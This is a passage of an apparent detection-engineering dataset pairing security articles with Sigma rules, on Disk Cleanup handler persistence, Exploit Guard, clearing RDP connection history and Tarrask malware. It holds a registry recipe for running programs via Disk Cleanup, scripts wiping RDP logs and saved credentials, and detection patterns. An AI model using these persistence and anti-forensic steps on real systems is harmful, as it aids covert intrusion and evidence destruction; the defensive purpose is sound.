one.\n\nFrom a forensic perspective, cleanmgr.exe updates the files in the following location:\n\n- c:\\WINDOWS\\system32\\LogFiles\\setupcln\\setupact.log\n- c:\\WINDOWS\\system32\\LogFiles\\setupcln\\setuperr.log\n\nI have not seen these files being updated with any references to the plug-ins loaded, but it could be a helpful artifact nevertheless…\n\nAnd… there is more…\n\nThe Disk Cleanup has a few more tricks for us to exploit.\n\nMany entries that we see listed under the VolumeCache node point to {C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}. This CLSID refers to c:\\Windows\\System32\\dataclen.dll file which is a generic folder and file deletion tool!\n\nThe values it relies on are:\n\n- Folder – where to look for files to delete e.g. c:\\test (refer to Microsoft article for a syntax for multiple entries)\n- Files – what files to look for e.g. *.foo (refer to Microsoft article for a syntax for multiple entries)\n- StateFlags=1 – an internal flag\n- Flags = 1 – a documented flag, here means ‘run the plug-in’, but it can also tell the tool to do more things (refer to Microsoft article for details)\n\nOnce these are set-up the program will search for the file(s) inside the folder(s) as per the Registry values. If any is found it will remove them as usual…\n\nBUT\n\nif any of these values exist:\n\n- PreCleanupString – a path to the program that will be executed prior to clean-up\n- CleanupString – a path to the program that will be executed after the clean-up\n\nit will also execute these programs prior and after the deletion!\n\nSounds interesting?\n\nTo trigger this one has to constantly drop c:\\test\\somefile.foo on the system. This will ensure the deletion library finds something to do and uses these two cleanup string entries and… these programs will be automatically executed.\n\nSo…\n\nOne can add their own entry, or modify the existing entries e.g.:\n\n- Diagnostic Data Viewer database files\n  - CleanupString = rundll32.exe utcutil.dll,DiskCleanupEnd\n  - PreCleanupString = rundll32.exe utcutil.dll,DiskCleanupStart\n- Windows Error Reporting Files\n  - PreCleanupString = wermgr.exe -purgestores\n- etc.\n\nThere is also a dangerous bit. One could use this mechanism to delete any folder/file on the system…\n\nLastly, if you want the PreCleanupString / CleanupString programs to be launched w/o gui, i.e. while using e.g. /autoclean command line switch, just need to add a dword value Autorun=1 to the same branch in the Registry e.g.:\n\n```image\nAlt: Autorun Registry\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically focusing on the path 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\BadGuy'. It shows various registry entries including 'CleanupString', 'Filelist', 'Folder', 'PreCleanupString', 'StateFlags', and 'Autorun', along with their respective types and data values. This information relates to the manipulation of the Disk Cleanup tool's behavior in Windows, indicating how certain entries can be configured to execute specified programs during cleanup operations.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\BadGuy\n  Name                     Type        Data\n  ---------------------------------------------------------\n  (Default)               REG_SZ     {C0E1361-0CC6-11d1-BBB6-0060978B2AE6}\n  CleanupString           REG_SZ     c:\\WINDOWS\\system32\\mspaint.exe\n  Filelist                REG_SZ     *.foo\n  Flags                   REG_DWORD  0x0000007d (125)\n  Folder                  REG_SZ     c:\\test\n  PreCleanupString        REG_SZ     c:\\windows\\system32\\notepad.exe\n  StateFlags              REG_DWORD  0x00000001 (1)\n  Autorun                 REG_DWORD  0x00000001 (1)\n```\n\n---\n\nThis entry was posted in Anti-Forensics, Autostart (Persistence).",
    "sigma_rule": {
      "title": "Potential Persistence Via Disk Cleanup Handler - Registry",
      "id": "d4f4e0be-cf12-439f-9e25-4e2cdcf7df5a",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence.\nThe disk cleanup manager is part of the operating system. It displays the dialog box […]\nThe user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-02-07",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_add"
      },
      "detection": {
        "selection": {
          "EventType": "CreateKey",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "filter": {
          "TargetObject|endswith": [
            "\\Active Setup Temp Folders",
            "\\BranchCache",
            "\\Content Indexer Cleaner",
            "\\D3D Shader Cache",
            "\\Delivery Optimization Files",
            "\\Device Driver Packages",
            "\\Diagnostic Data Viewer database files",
            "\\Downloaded Program Files",
            "\\DownloadsFolder",
            "\\Feedback Hub Archive log files",
            "\\Internet Cache Files",
            "\\Language Pack",
            "\\Microsoft Office Temp Files",
            "\\Offline Pages Files",
            "\\Old ChkDsk Files",
            "\\Previous Installations",
            "\\Recycle Bin",
            "\\RetailDemo Offline Content",
            "\\Setup Log Files",
            "\\System error memory dump files",
            "\\System error minidump files",
            "\\Temporary Files",
            "\\Temporary Setup Files",
            "\\Temporary Sync Files",
            "\\Thumbnail Cache",
            "\\Update Cleanup",
            "\\Upgrade Discarded Files",
            "\\User file versions",
            "\\Windows Defender",
            "\\Windows Error Reporting Files",
            "\\Windows ESD installation files",
            "\\Windows Upgrade Log Files"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate new entry added by windows"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_add\\registry_add_persistence_disk_cleanup_handler_entry.yml",
    "id": "908"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/",
    "markdown": "# Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware\n\n**Published**: October 23, 2017\n\nWindows Defender Exploit Guard is a new set of intrusion prevention capabilities that ships with the Windows 10 Fall Creators Update. The four components of Windows Defender Exploit Guard are designed to lock down the device against a wide variety of attack vectors and block behaviors commonly used in malware attacks, while enabling enterprises to balance their security risk and productivity requirements.\n\nTraditional antivirus technologies are an integral aspect of the endpoint security stack through the identification and removal of malicious executables using a combination of cloud-based machine learning and heuristics. Despite advances in antivirus detection capabilities, attackers are continuously adapting and have been expanding their arsenal of tricks and techniques to compromise endpoints, steal credentials, and execute ransomware attacks without ever needing to write anything to disk. This emerging trend of fileless attacks, which compose over 50% of all threats, are extremely dangerous, constantly changing, and designed to evade traditional AV. Fileless attacks have two types: those that use non-traditional executable files (e.g., documents with active content in them), and those that exploit vulnerabilities.\n\nWindows Defender Exploit Guard utilizes the capabilities of the Microsoft Intelligent Security Graph (ISG) and the world-class security research team at Microsoft to identify active exploits and common behaviors to stop these types of attacks at various stages of the kill chain. Although the underlying vulnerability being exploited varies, the delivery mechanism differs, and the payload changes, there is a core set of behaviors and vectors that many different attacks adhere to. By correlating streams of events to various malicious behaviors with the ISG, Windows Defender Exploit Guard provides the capability and controls needed to handle these types of emerging threats.\n\n## The four components of Windows Defender Exploit Guard are:\n\n1. **Attack Surface Reduction (ASR)**: A set of controls that enterprises can enable to prevent malware from getting on the machine by blocking Office-, script-, and email-based threats.\n2. **Network protection**: Protects the endpoint against web-based threats by blocking any outbound process on the device to untrusted hosts/IP through Windows Defender SmartScreen.\n3. **Controlled folder access**: Protects sensitive data from ransomware by blocking untrusted processes from accessing your protected folders.\n4. **Exploit protection**: A set of exploit mitigations (replacing EMET) that can be easily configured to protect your system and applications.\n\n---\n\n## Attack Surface Reduction (ASR): Intelligence to control the surface area of the device\n\nEmail and Office applications are generally thought of as keystones of enterprise productivity, yet they are the most common vector for attacks and can cause nightmares for security administrators. Both Office and email serve as simple and easy ways to distribute mechanism for bad actors to kick off malware and fileless attacks. Although Office macros and scripts have many productive use cases, malicious actors can use them to directly perform exploits that operate entirely in memory and are often undetectable by traditional AV techniques.\n\nAttack Surface Reduction provides enterprises with a set of built-in intelligence that can block the underlying behaviors used by these malicious documents to execute without hindering productive scenarios. By blocking malicious behaviors independent of what the threat or exploit is, ASR can protect enterprises from never before seen zero-day attacks like the recently discovered CVE-2017-8759, CVE-2017-11292, and CVE-2017-11826.\n\nThe different behaviors ASR provides coverage for in Fall Creators Updated are split among Office, scripts, and email.\n\nFor Office apps, ASR can:\n\n- Block Office apps from creating executable content\n- Block Office apps from launching child process\n- Block Office apps from injecting into process\n- Block Win32 imports from macro code in Office\n- Block obfuscated macro code\n\nFor script, ASR can:\n\n- Block malicious JavaScript, VBScript, and PowerShell codes that have been obfuscated\n- Block JavaScript and VBScript from executing payload downloaded from internet\n\nFor email, ASR can:\n\n- Block execution of executable content dropped from email (webmail/mail-client)\n\n---\n\n## Network protection: Blocking outbound connection\n\nThe internet is home to a swath of malicious websites that are designed to lure and trick users. They use phishing, deceptive ads, tech scams, social engineering, and other means as part of their campaigns. For some attacks, they seek to acquire information or get immediate financial payout, while others may attempt to install malware on the machine.\n\nWindows Defender SmartScreen protects Microsoft Edge from socially engineered malware, phishing, and other web-based threats through the power of the Intelligent Security Graph (ISG). This has made Microsoft Edge one of the most secure browsers out there, outperforming Chrome and Firefox in NSS Lab’s recent test results for phishing protection between August 23 and September 12, 2017.\n\nWindows Defender Exploit Guard’s network protection capability utilizes this same intelligence from ISG to vet, and if necessary block, all outbound connections before they are made. This brings the same level of protection that we previously just had for Microsoft Edge across the entire system and network stack.\n\n---\n\n## Controlled folder access\n\nEncryption of files by ransomware and other unauthorized apps means losing control of your data: documents, precious photos and videos, and other important files. For enterprises and small businesses, losing access to files can mean disrupted operations. Controlled folder access protects files by locking down critical folders, allowing only authorized apps to access files. Unauthorized apps, including malicious and suspicious executable files, DLLs, scripts, and others will be denied access even when they are running with the user’s or administrator’s privilege, which malware is often be able to secure.\n\nBy default, Controlled folder access protects common folders where documents and other important data are stored, but it’s also flexible. You can add additional folders to protect, including those on other drives. You can also allow apps that you trust to access protected folders, so if you’re using unique or custom app, your normal everyday productivity will be not affected.\n\n---\n\n## Exploit Protection\n\nWindows Defender Exploit Guard’s exploit protection represents the suite of vulnerability mitigation and hardening techniques that are built directly into Windows 10. As you install the Fall Creators Update, the appropriate mitigation settings will already be configured and applied on the machine.\n\n### Rest In Peace (RIP) EMET\n\nUsers of the Enhanced Mitigation Experience Toolkit (EMET) will notice that it was automatically uninstalled from your machine during the upgrade. This is because WDEG includes the best of EMET built directly into Windows 10, so it’s now just part of the platform. You can the find previous user experiences for configuring EMET vulnerability mitigation capabilities in Windows Defender Security Center. For more information, read Moving Beyond Emet II – Windows-Defender-Exploit-Guard.\n\nIt is important to note that Exploit Guard’s exploit protection accepts a different format for the mitigation configuration than EMET did. To make the process of migrating to Exploit Protection and Windows Defender Exploit Guard easier, there is a PowerShell module that converts EMET XML settings files into Windows 10 mitigation policies for Exploit Guard. This PowerShell module also provides an additional interface for Windows Defender Security Center to configure its mitigation settings.\n\n---\n\n## Windows Defender Exploit Guard manageability\n\nAll the Windows Defender Exploit Guard components are manageable by Group Policy (GP), System Center Configuration Manager (SCCM), and Mobile Device Management (MDM) such as Microsoft Intune.\n\nAll components support running in both Audit and Block modes. When Block mode is enabled and a corresponding malicious behavior is observed, Windows Defender Exploit Guard blocks the event from occurring in real-time. Block events for Attack Surface Reduction, Controlled folder access and Network Protection surface a notification toast to the endpoint in real-time as well as an event log, and can be centrally viewed by security operations personnel in the Windows Defender Advanced Threat Protection (Windows Defender ATP) console.\n\n---\n\n## Windows Defender Advanced Threat Protection\n\nWindows Defender ATP provides a single pane of glass experience for managing and viewing all the security feeds and events happening on managed endpoints across the enterprise. With Windows Defender ATP, the entire process tree execution can be seen for Exploit Guard events, making it extremely easy to determine what happened, such that a proper response can be executed.\n\n---\n\nIn the end, Windows Defender Exploit Guard is one of the most important new defenses that we’ve added to Windows 10 in the Fall Creators Update. In many ways, it completes our stack for preventive protection. Organizations that deploy it alongside Windows Defender Antivirus will find that they have a highly effective and differentiated solution for addressing modern fileless attacks and host intrusion. We recommend you evaluate it at the earliest opportunity and we look forward to your feedback.\n\nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, **sign up for a free trial**.\n\n---\n\n### Learn more about Windows 10 Fall Creators Update\n\n- Microsoft 365 Security and Management Features Available in Fall Creators Update\n- Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware\n- Stopping ransomware where it counts: Protecting your data with Controlled folder access\n- Making Microsoft Edge the most secure browser with Windows Defender Application Guard\n- Introducing Windows Defender Application Control\n- Hardening the system and maintaining integrity with Windows Defender System Guard\n- Move away from passwords, deploy Windows Hello. Today!\n- What’s new in Windows Defender ATP Fall Creators Update\n- Antivirus evolved",
    "sigma_rule": {
      "title": "Folder Removed From Exploit Guard ProtectedFolders List - Registry",
      "id": "272e55a4-9e6b-4211-acb6-78f51f0b1b40",
      "status": "test",
      "description": "Detects the removal of folders from the \"ProtectedFolders\" list of of exploit guard. This could indicate an attacker trying to launch an encryption process or trying to manipulate data inside of the protected folder",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\ProtectedFolders"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrators removing applications (should always be investigated)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_exploit_guard_protected_folders.yml",
    "id": "909"
  },
  {
    "url": "http://woshub.com/how-to-clear-rdp-connections-history/",
    "markdown": "# How to View and Clear RDP Connections History in Windows\n\nThe built-in Windows Remote Desktop Connection client (`mstsc.exe`) saves the remote computer name (or IP address) and the username that is used to log in after each successful connection to the remote RDP host. The next time the RDP client starts, the user can select one of the saved connections, and the previous username is automatically inserted. If you are using a public computer or a computer you don’t trust, you may want to clear your RDP connection history for security reasons.\n\n## Contents:\n- Delete the History of Remote Desktop Connections on Windows\n- Script to Clear RDP Connection History\n- How to Clear Remote Desktop Bitmap Cache?\n- How to Prevent Windows from Saving RDP Connection History\n- Remove Saved RDP Credentials on Windows\n\n```image\nAlt: history of rdp connections in windows\nDescription: The image displays a screenshot of the Remote Desktop Connection interface in Windows. It shows the input fields for the 'Computer' and 'User name', with a dropdown list of previously used IP addresses for remote connections. The interface includes options to edit saved credentials and a help button, indicating that it is focused on managing remote desktop connections.\nTranscription: |\n  Remote Desktop Connection\n  \n  Computer:\n  192.168.XXX.XXX\n  User name:\n  dlt\\ch1\n  \n  Saved credentials:\n  10.XXX.XXX.XXX\n  192.168.XXX.XXX\n  192.168.XXX.XXX\n  \n  You can edit or delete these.\n  \n  Show Options\n  Help\n```\n\nThis article describes where Windows stores Remote Desktop connection history and credentials, and how to clear RDP history and logs.\n\n## Delete the History of Remote Desktop Connections on Windows\n\nWindows stores the history of Remote Desktop client connections in several different places, and to completely clear the RDP history you will need to delete the data from all of these places.\n\n### How to Delete RDP Connection History from Registry\n\n1. Open the Registry Editor (`regedit.exe`) and go to the reg key **HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client**.\n2. The **Default** subkey contains history entries for the last _10_ RDP connections. The names of the parameters are **MRU0-MRU9** (MRU – Most Recently Used). Their values contain IP addresses/RDP host names. Select all the registry parameters in the key and delete them.\n\n   ```image\n   Alt: remove recent rdp entries from registry\n   Description: The image shows a screenshot of the Windows Registry Editor displaying the registry path 'HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default'. It includes a list of parameters under the 'Default' subkey, specifically highlighting the 'MRU0' to 'MRU9' entries, which represent the most recently used RDP connection history. The context menu for the 'MRU1' entry is open, showing options to 'Modify...' and 'Delete', indicating steps to manage RDP connection history.\n   Transcription: |\n     Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\n     - Default\n     - DefaultPrinter\n     - hwtset\n     - LocalDevices\n     - PublisherBypassList\n     - Servers\n      - MRU0\n      - MRU1\n      - MRU2\n      - MRU3\n      - MRU4\n      - MRU5\n      - MRU6\n      - MRU7\n      - MRU8\n      - MRU9\n   ```\n\n3. Then expand the **Servers** subkey. A list of all previously used RDP hosts and user accounts is stored here. The username is contained in the **UsernameHint** parameter. This username is automatically inserted into the mstsc.exe client window when you connect to this RDP host. The **CertHash** parameter contains the thumbprint of the server’s RDP certificate.\n\n   ```image\n   Alt: rdp history in registry: saved host and username\n   Description: The image shows a screenshot of the Windows Registry Editor displaying the path `HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\man01`. It highlights parameters related to Remote Desktop Protocol (RDP) connections, including the `CertHash` and `UsernameHint` entries, which indicate the server's certificate and the username used for the connection, respectively. This visual representation is relevant for users looking to manage or clear their RDP connection history.\n   Transcription: |\n     Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\man01\n     Name                Type        Data\n     (Default)          REG_SZ     (value not set)\n     CertHash           REG_BINARY 12 60 5f 7c 15 a5\n     UsernameHint       REG_SZ     corp\\d\n   ```\n\n4. Clear all entries in the Servers registry key. The easiest way to do this is to simply delete the entire Servers reg key, and then re-create it manually.\n\n   ```image\n   Alt: delete recent rdp servers in registry\n   Description: The image shows a screenshot of the Windows Registry Editor, specifically the path to the Remote Desktop Protocol (RDP) settings. It displays the key 'HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client' with a focus on the 'Servers' subkey. The context menu is open, indicating the 'Delete' option, which suggests the deletion of RDP connection history. This aligns with the instructions for clearing RDP connection history in Windows.\n   Transcription: |\n     Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\n        StorageLibrary\n        SystemCertificates\n        TabletTip\n        Terminal Server Client\n     \t   Default\n     \t   DefaultPrinter\n     \t   hwtorest\n     \t   LocalDevices\n     \t   PublisherBypassList\n     \t   Servers\n   ```\n\n### Delete the Default.RDP File\n\nThen delete the hidden **Default.rdp** file from the `%userprofile%\\Documents` folder in the user profile. This file stores information about the last RDP connection.\n\n### How to View and Clear RDP Event Viewer Logs in Windows\n\nThe RDP client also logs each outbound connection to the Event Viewer log (Applications and Services Logs -> Microsoft -> Windows -> TerminalServices-ClientActiveXCore -> **Microsoft-Windows-TerminalServices-RDPClient/Operational**).\n\n```image\nAlt: View RDP client logs in Event Viewer\nDescription: The image displays a screenshot of the Windows Event Viewer, highlighting the logs related to Remote Desktop Protocol (RDP) connections. It shows the directory path leading to 'Microsoft-Windows-TerminalServices-ClientActiveXCore', with a specific event (Event ID 1024) indicating that 'RDP ClientActiveX is trying to connect to the server.' The timestamp of the event is also visible, along with the log name, illustrating the structure and content of RDP client logs.\nTranscription: |\n  Event 1024, TerminalServices-ClientActiveXCore\n  \n  General\n  RDP ClientActiveX is trying to connect to the server (61)\n  \n  Details\n  Log Name: Microsoft-Windows-TerminalServices-RDPClient/Operational\n```\n\nTo list the log for outbound RDP client connections, use the Get-WinEvent cmdlet to select and filter the events in the Event Viewer:\n\n```\n$properties = @(\n@{n='TimeStamp';e={$_.TimeCreated}}\n@{n='LocalUser';e={$_.UserID}}\n@{n='Target RDP host';e={$_.Properties[1].Value}}\n)\nGet-WinEvent -FilterHashTable @{LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational';ID='1102'} | Select-Object $properties\n```\n\nYou can clear this event log from the Event Viewer console or by using the command:\n\n```\nWevtUtil cl Microsoft-Windows-TerminalServices-RDPClient/Operational\n```\n\n### Delete Recent RDP History Entries from the Start Menu and Taskbar\n\nWindows also stores recent remote desktop connections in Jump Lists. If you type `mstsc` in the Windows search box or right-click on the client in the taskbar, you will see the history of previous RDP connections in the Recent list.\n\nTo clear the RDP history in the Start Menu and Jump Lists, clear the Recent Items list by deleting the files in the `%AppData%\\Microsoft\\Windows\\Recent\\AutomaticDestinations` directory.\n\n```image\nAlt: rdp: recent items jump lists on windows 10\nDescription: The image shows a Windows interface displaying the search results for 'mstsc', the Remote Desktop Connection application. On the left side, it highlights the 'Best match' application, while on the right side, it shows options to 'Open' the application and lists 'Recent' connections, including an IP address (192.168.1.15) and a name (-dc01). This visual illustrates how users can access their recent Remote Desktop Protocol (RDP) connections within the Windows operating system.\nTranscription: |\n  Best match\n  App\n  Open\n  Recent\n  192.168.1.15\n  -dc01\n```\n\n## Script to Clear RDP Connection History\n\nTo quickly clear the history of RDP connections in Windows, you can use a batch script. This script will automatically perform the manual actions described above to clear the connection history and the RDP logs.\n\n```\n@echo off\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\"\nattrib -s -h %userprofile%\\documents\\Default.rdp\ndel %userprofile%\\documents\\Default.rdp\ndel /f /s /q /a %AppData%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\n```\n\nA similar PowerShell script to clear all entries in the RDP connection history:\n\n```\nGet-ChildItem \"HKCU:\\Software\\Microsoft\\Terminal Server Client\" -Recurse | Remove-ItemProperty -Name UsernameHint -Ea 0\nRemove-Item -Path 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\servers' -Recurse 2>&1 | Out-Null\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default' 'MR*' 2>&1 | Out-Null\n$docs = [environment]::getfolderpath(\"mydocuments\") + '\\Default.rdp'\nremove-item $docs -Force 2>&1 | Out-Null\n```\n\n## How to Clear Remote Desktop Bitmap Cache?\n\nBy default, the mstsc.exe client caches rarely modified areas of the remote desktop as bitmaps (persistent bitmap caching). The RDP client cache can significantly reduce network traffic.\n\nThe RDP client cache is stored in ***.bmc** and ***.bin** files in the `%LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache` folder.\n\n```image\nAlt: rdp bitmap cache files: bmc and bin\nDescription: The image is a screenshot of a file directory path in Windows, specifically showing the contents of the 'Cache' folder located at '%LOCALAPPDATA%\\Microsoft\\Terminal Server Client\\Cache'. It displays three files: 'bcache24.bmc' (0 KB), 'Cache0000.bin' (10,352 KB), and 'Cache0001.bin' (14,596 KB), including the 'Date modified' information for each file.\nTranscription: |\n  Name               Date modified       Type       Size\n  ---------------------------------------------------------\n  bcache24.bmc       1/23/2020 1:33 PM   BMC File   0 KB\n  Cache0000.bin      1/23/2020 1:38 PM   BIN File   10,352 KB\n  Cache0001.bin      1/23/2020 2:47 PM   BIN File   14,596 KB\n```\n\nFor security reasons, it is recommended that you clear the RDP cache folder and prevent the RDP client from saving the screen image to the cache. Disable the **Persistent bitmap caching** option on the **Advanced** tab of the Remote Desktop Connection client.\n\n```image\nAlt: rdc (mstsc) client: disable bitmap caching\nDescription: The image shows the 'Remote Desktop Connection' client interface on a Windows computer. It displays the 'Experience' tab where users can adjust performance settings for remote desktop connections. The options include features like 'Desktop background,' 'Font smoothing,' and 'Desktop composition.' Additionally, there are checkboxes for 'Persistent bitmap caching' and 'Reconnect if the connection is dropped.' The layout is typical of Windows applications and provides access to settings that can optimize the performance of RDP sessions.\nTranscription: |\n  Remote Desktop Connection\n  \n  Performance\n  Choose your connection speed to optimize performance.\n  Detect connection quality automatically\n  \n  Connection quality-dependent features:\n  - Desktop background\n  - Font smoothing\n  - Desktop composition\n  - Show window contents while dragging\n  - Menu and window animation\n  - Visual styles\n  \n  [ ] Persistent bitmap caching\n  [ ] Reconnect if the connection is dropped\n  \n  [Connect] [Help]\n```\n\n## How to Prevent Windows from Saving RDP Connection History\n\nIf you do not want Windows to store the history of RDP connections, you must deny writing to the `HKCU\\Software\\Microsoft\\Terminal Server Client` registry key. The first step is to disable the inheritance of permissions on the specified reg key (Permissions -> Advanced -> Disable inheritance). Then change the ACL of the registry key by selecting the **Deny** for users (but you should be aware that this is an unsupported configuration).\n\n```image\nAlt: prevent windows from saving rdp history in registry\nDescription: The image depicts the Windows Registry Editor, specifically showing the permissions settings for the 'Terminal Server Client' registry key under the path 'HKEY_CURRENT_USER\\Software\\Microsoft'. The left side displays the hierarchical structure of the registry, while the right side focuses on the 'Security' settings for the 'Terminal Server Client'. It highlights the user 'root (DESKTOP-JOPF9\\root)' with the 'Deny' checkbox checked for various permissions, indicating that this user is prohibited from making changes to the registry key, which is relevant to preventing Windows from saving RDP connection history.\nTranscription: |\n  Registry Editor\n  \n  Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\n  \n  Security\n  \n  Group or user names:\n  - RESTRICTED\n  - SYSTEM\n  - root [DESKTOP:JOPF9\\root]\n  \n  Permissions for root\n  Allow         Deny\n  Full Control  [ ]           [x]\n  Read          [ ]           [x]\n  Special permissions [ ]      [x]\n```\n\nAs a result, mstsc.exe is simply not able to write any RDP connection information to the registry.\n\n## Remove Saved RDP Credentials on Windows\n\nThe RDP client allows you to store the user’s password in the built-in Windows Credential Manager and automatically connect to a remote host without entering a password.\n\n```image\nAlt: mstsc can save rdp credentials\nDescription: The image depicts a Windows Security dialog box for Remote Desktop Connection. It prompts the user to 'Enter your credentials' to connect to a specified IP address (partially obscured). The fields present include a username and password input, along with a checkbox labeled 'Remember me'. The interface is part of the Remote Desktop Connection application, which is used to connect to remote systems.\nTranscription: |\n  Windows Security\n  Enter your credentials\n  These credentials will be used to connect to 192.16[...]\n  Username: \\[...]\\admin\n  Password: [........]\n  [ ] Remember me\n  [More choices]\n  [OK] [Cancel]\n```\n\nYou can delete saved RDP passwords from the Credential Manager window (run the command `rundll32.exe keymgr.dll,KRShowKeyMgr`). Remove all entries prefixed `TERMSRV\\`.\n\n```image\nAlt: Delete saved RDP (termsrv) credentials\nDescription: The image shows the 'Stored User Names and Passwords' window in Windows, specifically highlighting entries prefixed with 'TERMSRV\\'. These entries represent saved RDP (Remote Desktop Protocol) credentials in the Credential Manager. The window provides options to add, remove, or edit stored credentials, with the 'Remove' button visibly highlighted. This image is relevant to the context of managing RDP credentials and clearing saved passwords.\nTranscription: |\n  Stored User Names and Passwords\n  Windows can store your logon credentials for servers, Web sites, and programs. When you revisit one of those locations, Windows will try to log you on automatically.\n  \n  TERMSRV\\\n  termserv/  2021 (LegacyGeneric)\n  termserv/  (LegacyGeneric)\n  termserv/  (LegacyGeneric)\n  \n  [Remove]\n```\n\nOr you can clear the stored credentials for RDP with the command:\n\n```\nFor /F \"tokens=1,2 delims= \" %G in ('cmdkey /list ^| findstr \"target=TERMSRV\"') do cmdkey /delete %H\n```\n\nYou can prevent users from saving RDP passwords by enabling the Group Policy option **Network access: Do not allow storage of passwords and credentials for network authentication** (under Computer Configuration -> Administrative Templates -> Windows Components -> Desktop Services -> Remote Desktop Connection Client).",
    "sigma_rule": {
      "title": "Terminal Server Client Connection History Cleared - Registry",
      "id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
      "status": "test",
      "description": "Detects the deletion of registry keys containing the MSTSC connection history",
      "references": [
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
        "http://woshub.com/how-to-clear-rdp-connections-history/",
        "https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-10-19",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Default\\MRU"
        },
        "selection2": {
          "EventType": "DeleteKey",
          "TargetObject|contains": "\\Microsoft\\Terminal Server Client\\Servers\\"
        },
        "condition": "1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_mstsc_history_cleared.yml",
    "id": "911"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
    "markdown": "# Tarrask malware uses scheduled tasks for defense evasion\n\n**Published**: April 12, 2022\n\n## April 2023 update\n\nMicrosoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **HAFNIUM** is now tracked as **Silk Typhoon**.\n\nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.\n\n---\n\nAs Microsoft continues to track the high-priority state-sponsored threat actor HAFNIUM, new activity has been uncovered that leverages unpatched zero-day vulnerabilities as initial vectors. The Microsoft Detection and Response Team (DART) in collaboration with the Microsoft Threat Intelligence Center (MSTIC) identified a multi-stage attack targeting the Zoho Manage Engine Rest API authentication bypass vulnerability to initially implant a Godzilla web shell with similar properties detailed by the Unit42 team in a previous blog.\n\nMicrosoft observed HAFNIUM from August 2021 to February 2022, targeting those in the telecommunication, internet service provider, and data services sector, expanding on targeted sectors observed from their earlier operations conducted in Spring 2021.\n\nFurther investigation reveals forensic artifacts of the usage of Impacket tooling for lateral movement and execution and the 